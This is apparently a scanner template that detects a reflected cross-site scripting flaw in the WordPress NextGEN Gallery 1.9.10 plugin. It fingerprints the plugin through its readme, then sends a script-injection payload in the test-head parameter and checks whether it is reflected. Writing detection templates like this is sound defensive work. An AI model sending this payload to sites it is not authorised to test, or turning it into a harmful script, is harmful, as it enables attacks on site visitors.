id: wp-nextgen-xss
brief:
    title: WordPress NextGEN Gallery 1.9.10 - Cross-Site Scripting
    by: daffainfo
    level: high
    about: WordPress NextGEN Gallery 1.9.10 plugin contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected...
    label:
        - wp-plugin
        - edb
        - wordpress
        - xss
        - vuln
    score: CVSS:7.2
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/wp-content/plugins/nextgen-gallery/readme.txt'
      signs:
        - "on": word
          has:
            - = NextGEN Gallery
          in: body
    - verb: GET
      to:
        - '{{BaseURL}}/wp-content/plugins/nextgen-gallery/nggallery.php?test-head=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
      signs:
        - "on": word
          has:
            - </script><script>alert(document.domain)</script>
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
